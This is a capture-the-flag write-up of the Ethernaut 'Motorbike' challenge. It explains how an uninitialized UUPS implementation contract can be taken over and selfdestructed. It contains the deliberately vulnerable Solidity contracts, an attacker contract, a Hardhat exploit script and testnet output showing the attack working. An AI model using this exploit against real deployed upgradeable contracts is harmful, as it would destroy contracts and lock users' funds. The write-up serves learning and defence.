---
title: Ethernaut Motorbike
tags: [ethernaut]
style: border
color: primary
description: Ethernaut Motorbike challenge writeup
---

## Motorbike

### Challenge

Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to `selfdestruct` its engine and make the motorbike unusable ?

Things that might help:

* [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)
* [UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) upgradeable pattern
* [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract


```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

### Background

This challenge was about a vulnerability I have read about while working with upgradeable contracts and recenlty also looked into so I knew more or less what I had to do. I only needed to look into the details on how to execute it. So lets have a look at some of the interesting parts of this challenge.

The `UUPS proxy pattern` is a way to create upgradeable contracts which have the upgradeability logic in the implementation contract as opposed to the `transparent proxy pattern` which has the upgradeability in the proxy its self. This has a set of pros and cons which I won't get into here.

When working with proxy contracts, the constructor is never used to initialize the state of the contract. The reason is that the constructor of the implementation contract is not executed in the context of the proxy and this will leave the contract in an uninitialized state. Instead of using a constructor, upgradeable contracts use an `initializer` function which can only be called once. When the implementation contract is passed to the proxy it is initialized so that the state is created in the proxy.

So one would now expect that once the proxy is initialized, all calls to the proxy would be safe, even without initializing the implementation contract, since the state of the implementation is never affecting the execution of the proxy. This is true as far as logic running in the context of the proxy is concerned.

The problem arrises from the fact that UUPS implementation contracts include the implementation logic in the contract its self. This means that if an attacker can execute the upgrade functionality, they can upgrade the implementation function to an attacker controlled contract and execute a `selfdestruct` function in the context of the implementation. Normally this would not be the case, since the call to upgrade is under some form of access control and only the upgrader should be able to call this functionality. However, the upgrader is set during the initialization, and the implementation contract is not initialized yet, an attacker could initialize it and become the upgrader.

### Attack

Based on the discussion above, the attack is pretty straight forward. First a contract is made with some function calling `selfdestruct`. Then the implementation address location is found from the proxy contract by accessing slot `keccak256('eip1967.proxy.implementation')-1`. Then the implementation address is used to initialize the implementation contract. Finally calling `upgradeToAndCall` on the implementation giving the address of the contract created and a call to the `selfdestruct` functionality should trigger the `selfdestruct` in the context of the implementation.

* Create a contract that can has a `selfDestruct` function that calls `selfdestruct`
* Get the implementation contract by reading slot `keccak256('eip1967.proxy.implementation')-1` in the proxy contract
* Initialize the contract by calling the `initialize` function on the implementation contract
* Call the `upgradeToAndCall` function with the first argument the contract containing the `selfDestruct` method and the second argument the function selector of `selfDestruct`

#### MotorbikeSolve.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;

contract MotorbikeSolve {

    constructor() public {}
    
    function selfDestruct () public payable {
        selfdestruct(tx.origin);
    }
}
```

#### motorbike-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function main() {
    motorbikeAddress = "0xd3de2A33bCebeEa8BeEa1E114Dd6eFd74A073E6F";
    contract = await ethers.getContractAt("Engine", motorbikeAddress);
    proxy = await ethers.getContractAt("Motorbike", motorbikeAddress);

    const accounts = await hre.ethers.getSigners();
    account = accounts[0];

    // get implementation address slot
    implementationSlot = ethers.BigNumber.from(ethers.utils.keccak256(ethers.utils.toUtf8Bytes("eip1967.proxy.implementation"))).sub(1)
    implementationAddress = ethers.utils.hexDataSlice(await ethers.provider.getStorageAt(contract.address, implementationSlot), 12);

    implementation = await ethers.getContractAt("Engine", implementationAddress);

    MotorbikeSolve = await ethers.getContractFactory("MotorbikeSolve");
    motorbikeSolve = await MotorbikeSolve.deploy();
    await motorbikeSolve.deployed();

    console.log("Level address: " + contract.address)
    console.log("Horse Power  : " + await contract.horsePower())
    console.log("")

    // initialize implementation contract
    console.log("Initializing implementation contract")
    tx = await implementation.connect(account).initialize()
    receipt = await tx.wait()

    // upgrade to attacker controlled contract and call selfDestruct
    console.log("Upgrading implementation contract and triggering selfdestruct")
    selfDestructCallData = motorbikeSolve.interface.encodeFunctionData("selfDestruct")
    tx = await implementation.upgradeToAndCall(motorbikeSolve.address, selfDestructCallData)
    receipt = await tx.wait()

    console.log("")
    try {
        console.log("Horse Power  : " + await contract.horsePower())
    } catch {
        console.log("Horse Power  : contract reverted")
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash
$ npx hardhat run scripts/motorbike-solve.js --network rinkeby
Level address: 0xd3de2A33bCebeEa8BeEa1E114Dd6eFd74A073E6F
Horse Power  : 1000

Initializing implementation contract
Upgrading implementation contract and triggering selfdestruct

Horse Power  : contract reverted
```

### Success Message

The advantage of following an UUPS pattern is to have very minimal proxy to be deployed. The proxy acts as storage layer so any state modification in the implementation contract normally doesn't produce side effects to systems using it, since only the logic is used through delegatecalls.

This doesn't mean that you shouldn't watch out for vulnerabilities that can be exploited if we leave an implementation contract uninitialized.

This was a slightly simplified version of what has really been discovered after months of the release of UUPS pattern.

Takeways: never leaves implementation contracts uninitialized ;)

If you're interested in what happened, read more [here](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680).
